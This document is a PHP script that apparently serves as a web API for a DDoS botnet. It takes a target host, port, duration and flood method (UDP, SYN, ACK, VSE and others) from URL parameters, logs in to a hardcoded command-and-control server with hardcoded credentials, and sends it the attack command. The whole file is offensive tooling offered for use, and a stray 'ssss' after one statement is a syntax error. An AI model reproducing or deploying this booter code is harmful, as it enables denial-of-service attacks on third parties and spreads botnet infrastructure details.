<?php
//API Link: http://ServerIP/CiaAPI.php?&ip=IP&port=PORT&time=TIME&method=METHOD
set_time_limit(0);

$server = "107.173.23.244";// Your Server Ip
$conport = 65501;// Your C2 Port
$username = "hilix";
$password = "hilix";

$activekeys = array();

$method = $_GET['type'];
$target = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];

if($method == "STD"){$command = ". STD $target $port $time";}
if($method == "UDP"){$command = ". UDP $target $port $time";}
if($method == "VSE"){$command = ". VSE $target $port $time";}
if($method == "TCP"){$command = ". TCP $target $port $time";}
if($method == "XMS"){$command = ". XMS $target $port $time";}
if($method == "ACK"){$command = ". ACK $target $port $time";}
if($method == "SYN"){$command = ". SYN $target $port $time";}


$sock = fsockopen($server, $conport, $errno, $errstr, 2);

if(!$sock){
        echo "Couldn't Connect To CNC Server...";
} else{
        print(fread($sock, 512)."\n");
        fwrite($sock, $username . "\n");
        echo "<br>";
        print(fread($sock, 512)."\n");
        fwrite($sock, $password . "\n");
        echo "<br>";
        if(fread($sock, 512)){
                print(fread($sock, 512)."\n");
        }

        fwrite($sock, $command . "\n");ssss
        fclose($sock);
        echo "<br>";
        echo "> $command ";
}
?>